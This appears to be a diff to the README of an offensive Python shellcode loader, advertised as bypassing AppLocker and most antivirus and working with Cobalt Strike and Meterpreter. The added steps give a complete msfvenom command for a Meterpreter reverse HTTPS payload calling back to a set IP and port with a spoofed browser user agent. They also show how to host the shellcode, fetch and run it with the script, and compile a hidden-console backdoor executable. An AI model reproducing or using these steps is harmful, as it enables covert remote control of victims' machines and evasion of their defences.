@@ -20,10 +20,18 @@ Pure chaos.
 - Bypasses AppLocker & most AV by default  
 - Works with Cobalt Strike, Meterpreter, custom payloads  
 
-### Quick Start
+## Quick Start
+
+### Payload Development - msfvenom
+
+```
+msfvenom -p windows/x64/meterpreter_reverse_https LHOST=10.69.27.216 LPORT=4455 LURI=/api/v1/data/ HTTPUSERAGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.3240.76" -f  raw > shellcode.bin
+```
+---
+
+### Host your shellcode
 
 ```bash
-# 1. Host your shellcode
 python -m http.server 80
 
 # 2. Edit URL in script
@@ -31,3 +39,14 @@ SHELLCODE_URL = "http://your-ip:80/shellcode.bin"
 
 # 3. Run
 python pystageless.py
+
+---
+```
+
+### Standalone exe Compilation
+
+```
+python -m PyInstaller -F backdoor.py --noconsole
+```
+
+
